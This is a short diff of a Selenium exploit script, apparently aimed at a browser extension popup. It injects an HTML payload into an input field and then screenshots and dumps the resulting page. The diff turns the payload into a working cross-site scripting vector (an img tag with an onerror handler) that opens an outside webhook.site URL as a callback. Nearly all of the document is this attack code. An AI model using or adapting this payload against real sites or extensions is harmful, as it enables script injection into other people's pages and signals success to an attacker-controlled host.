@@ -101,7 +101,7 @@ with Display() as disp:
 
     new = driver.current_window_handle
 
-    driver.get('https://instagram.com')
+    driver.get('https://www.example.com')
 
     # # driver.get("chrome-extension://aapbdbdomjkkjkaonfhkkikfgjllcleb/popup.html")
     time.sleep(3)
@@ -111,7 +111,7 @@ with Display() as disp:
 
     a = driver.find_element(By.ID,'replacementInput')
 
-    payload = '<img src="window.open(`https://webhook.site/9aa600fc-057a-445d-b039-d62660ade568`)">'
+    payload = '<img src=x onerror="window.open(`https://webhook.site/9aa600fc-057a-445d-b039-d62660ade568`)">'
 
     a.send_keys(payload)
 
@@ -126,9 +126,10 @@ with Display() as disp:
     b.click()
     
     driver.switch_to.window(new)
+    time.sleep(1)
     driver.get_screenshot_as_file("ss.png")
 
-    driver.switch_to.window(original)
+    # driver.switch_to.window(original)
 
     print(driver.page_source)
 
